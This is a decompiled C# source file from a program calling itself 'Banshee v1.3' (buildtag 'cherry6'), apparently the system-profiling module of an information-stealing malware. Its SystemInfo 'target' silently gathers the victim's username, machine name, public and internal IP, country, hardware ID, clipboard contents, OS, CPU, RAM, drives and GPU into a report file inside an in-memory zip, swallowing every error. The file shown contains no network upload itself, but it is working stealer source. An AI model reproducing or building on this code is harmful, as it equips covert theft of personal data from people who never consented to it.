﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Banshee.Helper;
using Banshee.Helper.Data;
using Microsoft.Win32;

namespace Banshee.Targets.Device
{
	// Token: 0x02000062 RID: 98
	internal class SystemInfo : ITarget
	{
		// Token: 0x06000100 RID: 256 RVA: 0x000079EC File Offset: 0x000079EC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.AppendLine(string.Format("~~Banshee v1.3 Report ({0:yyyy-MM-dd HH:mm})", DateTime.Now));
				stringBuilder.AppendLine("Buildtag: cherry6");
				stringBuilder.AppendLine();
				stringBuilder.AppendLine();
				Task<string> task = Task.Run<string>(() => SystemInfo.BuildUserSection());
				Task<string> task2 = Task.Run<string>(() => SystemInfo.BuildNetworkSection());
				Task<string> task3 = Task.Run<string>(() => SystemInfo.BuildSystemSection());
				Task<string> task4 = Task.Run<string>(() => SystemInfo.BuildDrivesSection());
				Task<string> task5 = Task.Run<string>(() => SystemInfo.BuildGpuSection());
				Task<string> task6 = Task.Run<string>(() => SystemInfo.BuildBasicSection());
				Task.WaitAll(new Task[]
				{
					task,
					task2,
					task3,
					task4,
					task5,
					task6
				});
				StringBuilder stringBuilder2 = new StringBuilder();
				stringBuilder2.Append(stringBuilder);
				stringBuilder2.AppendLine(task.Result).AppendLine();
				stringBuilder2.AppendLine(task2.Result).AppendLine();
				stringBuilder2.AppendLine(task3.Result).AppendLine();
				stringBuilder2.AppendLine(task4.Result).AppendLine();
				stringBuilder2.AppendLine(task5.Result).AppendLine();
				stringBuilder2.AppendLine(task6.Result);
				zip.AddTextFile("Information.txt", stringBuilder2.ToString());
			}
			catch
			{
			}
		}

		// Token: 0x06000101 RID: 257 RVA: 0x00007BF0 File Offset: 0x00007BF0
		private static string BuildUserSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[User Info]");
			try
			{
				stringBuilder.AppendLine("User: " + Environment.UserName);
				stringBuilder.AppendLine("Machine: " + Environment.MachineName);
				stringBuilder.AppendLine(string.Format("Now: {0:yyyy-MM-dd HH:mm:ss}", DateTime.Now));
			}
			catch
			{
				stringBuilder.AppendLine("User/System fields unavailable");
			}
			try
			{
				string executableLocation = SystemInfo.GetExecutableLocation();
				stringBuilder.AppendLine("FileLocation: " + executableLocation);
			}
			catch
			{
				stringBuilder.AppendLine("FileLocation: unavailable");
			}
			try
			{
				stringBuilder.AppendLine("Country: " + IpApi.GetCountryName());
			}
			catch
			{
				stringBuilder.AppendLine("Country: UnknownCountry");
			}
			try
			{
				InputLanguage currentInputLanguage = InputLanguage.CurrentInputLanguage;
				string text;
				if (currentInputLanguage == null)
				{
					text = null;
				}
				else
				{
					CultureInfo culture = currentInputLanguage.Culture;
					text = ((culture != null) ? culture.TwoLetterISOLanguageName : null);
				}
				string str = text ?? "unknown";
				stringBuilder.AppendLine("Input ISO: " + str);
			}
			catch
			{
				stringBuilder.AppendLine("Input ISO: unknown");
			}
			stringBuilder.AppendLine("Hwid: " + HwidGenerator.GetHwid());
			stringBuilder.AppendLine("Clipboard: " + SystemInfo.GetClipboardTextNoTimeout());
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x06000102 RID: 258 RVA: 0x00007D74 File Offset: 0x00007D74
		private static string BuildNetworkSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[Network]");
			stringBuilder.AppendLine("External IP: " + IpApi.GetPublicIp());
			string text = "unavailable";
			string text2 = "unavailable";
			try
			{
				foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
				{
					if (networkInterface.OperationalStatus == OperationalStatus.Up && networkInterface.NetworkInterfaceType != NetworkInterfaceType.Loopback)
					{
						IPInterfaceProperties ipproperties = networkInterface.GetIPProperties();
						foreach (UnicastIPAddressInformation unicastIPAddressInformation in ipproperties.UnicastAddresses)
						{
							if (unicastIPAddressInformation.Address.AddressFamily == AddressFamily.InterNetwork)
							{
								text = unicastIPAddressInformation.Address.ToString();
								break;
							}
						}
						foreach (GatewayIPAddressInformation gatewayIPAddressInformation in ipproperties.GatewayAddresses)
						{
							if (gatewayIPAddressInformation.Address != null && gatewayIPAddressInformation.Address.AddressFamily == AddressFamily.InterNetwork)
							{
								text2 = gatewayIPAddressInformation.Address.ToString();
								break;
							}
						}
						if (text != "unavailable" && text2 != "unavailable")
						{
							break;
						}
					}
				}
			}
			catch
			{
			}
			stringBuilder.AppendLine("Internal IP: " + text);
			stringBuilder.AppendLine("Default Gateway: " + text2);
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x06000103 RID: 259 RVA: 0x00007F44 File Offset: 0x00007F44
		private static string BuildSystemSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[System]");
			try
			{
				stringBuilder.AppendLine("OS Product: " + WindowsInfo.GetProductName());
				stringBuilder.AppendLine("OS Build: " + WindowsInfo.GetBuildNumber());
				stringBuilder.AppendLine("OS Arch: " + WindowsInfo.GetArchitecture());
			}
			catch
			{
				stringBuilder.AppendLine("OS: unavailable");
			}
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"))
				{
					string text;
					if ((text = (((registryKey != null) ? registryKey.GetValue("ProcessorNameString") : null) as string)) == null)
					{
						text = ((((registryKey != null) ? registryKey.GetValue("VendorIdentifier") : null) as string) ?? "Unknown");
					}
					string str = text;
					stringBuilder.AppendLine("CPU Name: " + str);
					stringBuilder.AppendLine(string.Format("Logical Cores: {0}", Environment.ProcessorCount));
				}
			}
			catch
			{
				stringBuilder.AppendLine("CPU: unavailable");
			}
			try
			{
				NativeMethods.MEMORYSTATUSEX memorystatusex = new NativeMethods.MEMORYSTATUSEX
				{
					dwLength = (uint)Marshal.SizeOf(typeof(NativeMethods.MEMORYSTATUSEX))
				};
				if (NativeMethods.GlobalMemoryStatusEx(ref memorystatusex))
				{
					ulong num = memorystatusex.ullTotalPhys / 1024UL / 1024UL;
					ulong num2 = memorystatusex.ullAvailPhys / 1024UL / 1024UL;
					stringBuilder.AppendLine(string.Format("RAM Total (MB): {0}", num));
					stringBuilder.AppendLine(string.Format("RAM Available (MB): {0}", num2));
				}
				else
				{
					stringBuilder.AppendLine("RAM: unavailable");
				}
			}
			catch
			{
				stringBuilder.AppendLine("RAM: unavailable");
			}
			try
			{
				stringBuilder.AppendLine("Screensize: " + SystemInfo.GetPrimaryScreenSize());
			}
			catch
			{
				stringBuilder.AppendLine("Screensize: unavailable");
			}
			try
			{
				stringBuilder.AppendLine("Keyboard: " + SystemInfo.GetKeyboardLayouts());
			}
			catch
			{
				stringBuilder.AppendLine("Keyboard: unavailable");
			}
			try
			{
				CultureInfo installedUICulture = CultureInfo.InstalledUICulture;
				string str2 = ((installedUICulture != null) ? installedUICulture.Name : null) ?? "unavailable";
				stringBuilder.AppendLine("System Language: " + str2);
			}
			catch
			{
				stringBuilder.AppendLine("System Language: unavailable");
			}
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x06000104 RID: 260 RVA: 0x000081EC File Offset: 0x000081EC
		private static string GetExecutableLocation()
		{
			try
			{
				string executablePath = Application.ExecutablePath;
				if (!string.IsNullOrWhiteSpace(executablePath))
				{
					return executablePath;
				}
			}
			catch
			{
			}
			try
			{
				using (Process currentProcess = Process.GetCurrentProcess())
				{
					string text;
					if (currentProcess == null)
					{
						text = null;
					}
					else
					{
						ProcessModule mainModule = currentProcess.MainModule;
						text = ((mainModule != null) ? mainModule.FileName : null);
					}
					string text2 = text;
					if (!string.IsNullOrWhiteSpace(text2))
					{
						return text2;
					}
				}
			}
			catch
			{
			}
			return "unavailable";
		}

		// Token: 0x06000105 RID: 261 RVA: 0x0000827C File Offset: 0x0000827C
		private static string GetPrimaryScreenSize()
		{
			Screen primaryScreen = Screen.PrimaryScreen;
			if (primaryScreen == null)
			{
				return "unknown";
			}
			return string.Format("{0}x{1}", primaryScreen.Bounds.Width, primaryScreen.Bounds.Height);
		}

		// Token: 0x06000106 RID: 262 RVA: 0x000082C8 File Offset: 0x000082C8
		private static string GetKeyboardLayouts()
		{
			if (InputLanguage.InstalledInputLanguages == null || InputLanguage.InstalledInputLanguages.Count == 0)
			{
				return "unknown";
			}
			IEnumerable<string> values = from name in InputLanguage.InstalledInputLanguages.Cast<InputLanguage>().Select(delegate(InputLanguage lang)
			{
				string result;
				try
				{
					string text2;
					if (lang == null)
					{
						text2 = null;
					}
					else
					{
						CultureInfo culture = lang.Culture;
						text2 = ((culture != null) ? culture.Name : null);
					}
					string text3;
					if ((text3 = text2) == null)
					{
						text3 = (((lang != null) ? lang.LayoutName : null) ?? "unknown");
					}
					result = text3;
				}
				catch
				{
					result = "unknown";
				}
				return result;
			})
			where !string.IsNullOrWhiteSpace(name)
			select name;
			string text = string.Join(", ", values);
			if (string.IsNullOrWhiteSpace(text))
			{
				return "unknown";
			}
			return text;
		}

		// Token: 0x06000107 RID: 263 RVA: 0x0000835C File Offset: 0x0000835C
		private static string BuildDrivesSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[Drives]");
			try
			{
				List<string> list = (from d in DriveInfo.GetDrives()
				where d.IsReady
				select d).Select(delegate(DriveInfo d)
				{
					long num = d.TotalSize / 1024L / 1024L / 1024L;
					long num2 = d.TotalFreeSpace / 1024L / 1024L / 1024L;
					return string.Format("{0} {1} FS:{2} Size:{3}GB Free:{4}GB", new object[]
					{
						d.Name.TrimEnd(new char[]
						{
							'\\'
						}),
						d.DriveType,
						d.DriveFormat,
						num,
						num2
					});
				}).ToList<string>();
				if (list.Any<string>())
				{
					using (List<string>.Enumerator enumerator = list.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							string value = enumerator.Current;
							stringBuilder.AppendLine(value);
						}
						goto IL_AB;
					}
				}
				stringBuilder.AppendLine("No ready drives");
				IL_AB:;
			}
			catch
			{
				stringBuilder.AppendLine("Drives: unavailable");
			}
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x06000108 RID: 264 RVA: 0x00008454 File Offset: 0x00008454
		private static string BuildGpuSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[GPU]");
			try
			{
				List<string> gpuNames = SystemInfo.GetGpuNames();
				if (gpuNames.Any<string>())
				{
					using (List<string>.Enumerator enumerator = gpuNames.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							string value = enumerator.Current;
							stringBuilder.AppendLine(value);
						}
						goto IL_5E;
					}
				}
				stringBuilder.AppendLine("None");
				IL_5E:;
			}
			catch
			{
				stringBuilder.AppendLine("GPUs: unavailable");
			}
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x06000109 RID: 265 RVA: 0x000084FC File Offset: 0x000084FC
		private static string BuildBasicSection()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("[Basic]");
			try
			{
				stringBuilder.AppendLine("User Domain: " + Environment.UserDomainName);
			}
			catch
			{
				stringBuilder.AppendLine("User Domain: unavailable");
			}
			try
			{
				stringBuilder.AppendLine(string.Format("CLR Version: {0}", Environment.Version));
			}
			catch
			{
				stringBuilder.AppendLine("CLR Version: unavailable");
			}
			return stringBuilder.ToString().TrimEnd(Array.Empty<char>());
		}

		// Token: 0x0600010A RID: 266 RVA: 0x00008598 File Offset: 0x00008598
		private static string GetClipboardTextNoTimeout()
		{
			string result = string.Empty;
			try
			{
				Thread thread = new Thread(delegate()
				{
					try
					{
						if (Clipboard.ContainsText())
						{
							result = Clipboard.GetText();
						}
					}
					catch
					{
					}
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.IsBackground = true;
				thread.Start();
				thread.Join();
			}
			catch
			{
			}
			return result ?? string.Empty;
		}

		// Token: 0x0600010B RID: 267 RVA: 0x00008604 File Offset: 0x00008604
		private static List<string> GetGpuNames()
		{
			List<string> list = new List<string>();
			try
			{
				uint num = 0U;
				NativeMethods.DISPLAY_DEVICE display_DEVICE = default(NativeMethods.DISPLAY_DEVICE);
				display_DEVICE.cb = Marshal.SizeOf<NativeMethods.DISPLAY_DEVICE>(display_DEVICE);
				while (NativeMethods.EnumDisplayDevices(null, num, ref display_DEVICE, 0U))
				{
					if (!string.IsNullOrWhiteSpace(display_DEVICE.DeviceString))
					{
						list.Add(display_DEVICE.DeviceString.Trim());
					}
					num += 1U;
					display_DEVICE = new NativeMethods.DISPLAY_DEVICE
					{
						cb = Marshal.SizeOf(typeof(NativeMethods.DISPLAY_DEVICE))
					};
				}
			}
			catch
			{
			}
			return list.Distinct<string>().ToList<string>();
		}
	}
}
